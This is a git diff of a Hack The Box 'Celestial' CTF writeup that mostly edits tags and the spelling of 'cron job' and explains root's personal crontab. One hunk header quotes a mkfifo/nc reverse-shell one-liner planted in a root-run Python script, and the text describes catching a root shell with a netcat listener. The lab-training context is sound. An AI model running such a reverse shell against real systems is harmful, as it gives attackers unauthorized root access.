@@ -2,12 +2,13 @@
 layout: post
 title:  "Hack The Box - Celestial - Writeup"
 date:   2021-11-13 07:00:00 +0200
-tags: ["Hack The Box","OSWE"]
+#mainTags: ["Hack The Box","OSWE"]
+tags: ["Burp Suite","CVE-2017-5941","Cron Job","Deserialization","Hack The Box","Hack The Box - Medium","Hack The Box - Linux","JavaScript","NodeJS","OSWE","Python3"]
 ---
 {% assign imgDir="2021-11-13-HTB-Celestial-Writeup" %}
 
 # Introduction
-The hack the box machine "Celestial" is a medium machine which is included in [TJnull's OSWE Preparation List](https://docs.google.com/spreadsheets/d/1dwSMIAPIam0PuRBkCiDI88pU3yzrqqHkDtBngUHNCw8/edit#gid=665299979). Exploiting this machine requires knowledge in the areas of NodeJS deserialization and cronjobs. The most challenging part, though, is the deserialization part, which is probably why the machine is categorized as medium rather than easy.
+The hack the box machine "Celestial" is a medium machine which is included in [TJnull's OSWE Preparation List](https://docs.google.com/spreadsheets/d/1dwSMIAPIam0PuRBkCiDI88pU3yzrqqHkDtBngUHNCw8/edit#gid=665299979). Exploiting this machine requires knowledge in the areas of NodeJS deserialization and cron jobs. The most challenging part, though, is the deserialization part, which is probably why the machine is categorized as medium rather than easy.
 
 <img style="Width:550px;" src="/assets/{{ imgDir }}/card.png" alt="BlockyCard">
 
@@ -101,11 +102,11 @@ echo 'import os\nos.system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.
 
 Then, we start a netcat listener by executing `nc -lvnp 443` and wait for our malicious python script to execute. After at most 5 minutes, we get a connection and obtain a root shell as can be seen in the image above.
 
-# Extra - Finding the Cronjob
-When enumerating the target as the `sun` user, it wasn't possible to find any cronjob which was configured to execute the `script.py` script on a regular basis as the `root` user. To understand why, we need to understand that there are two types of crontabs. The first is the system wide crontab which corresponds to the file `/etc/crontab`. This file contains one cronjob per line and includes a column which defines with which user's permissions each cronjob should execute. The second type is personal crontabs. Personal crontabs are normally stored in `/var/spool/crontabs/[username]` where `username` corresponds to the username which the personal crontab belongs to. A personal crontab can only be accessed by its corresponding user and always executes with the permissions of the corresponding user.
+# Extra - Finding the Cron Job
+When enumerating the target as the `sun` user, it wasn't possible to find any cron job which was configured to execute the `script.py` script on a regular basis as the `root` user. To understand why, we need to understand that there are two types of crontabs. The first is the system wide crontab which corresponds to the file `/etc/crontab`. This file contains one cron job per line and includes a column which defines with which user's permissions each cron job should execute. The second type is personal crontabs. Personal crontabs are normally stored in `/var/spool/crontabs/[username]` where `username` corresponds to the username which the personal crontab belongs to. A personal crontab can only be accessed by its corresponding user and always executes with the permissions of the corresponding user.
 
 ![extra1](/assets/{{ imgDir }}/extra1.png)
 
-Once we have a root shell, we can find the personal cronjobs of the `root` user by executing the command `crontab -l` as shown above. The `grep -v '#'` part of the command is only used to omit comments from the output. The `crontab -l` command shows the personal crontab of the `root` user which is stored in the file `/var/spool/crontabs/root` and can only be accessed by the `root` user. As can be seen in the output of the command, the `script.py` script is executed every 5 minutes. In conclusion, the `sun` user could not possibly have found this cronjob since it was located in the `root` user's personal crontab which only the `root` user is permitted to access.
+Once we have a root shell, we can find the personal cron jobs of the `root` user by executing the command `crontab -l` as shown above. The `grep -v '#'` part of the command is only used to omit comments from the output. The `crontab -l` command shows the personal crontab of the `root` user which is stored in the file `/var/spool/crontabs/root` and can only be accessed by the `root` user. As can be seen in the output of the command, the `script.py` script is executed every 5 minutes. In conclusion, the `sun` user could not possibly have found this cron job since it was located in the `root` user's personal crontab which only the `root` user is permitted to access.
 
 <!-- Mention pspy brifely? -->
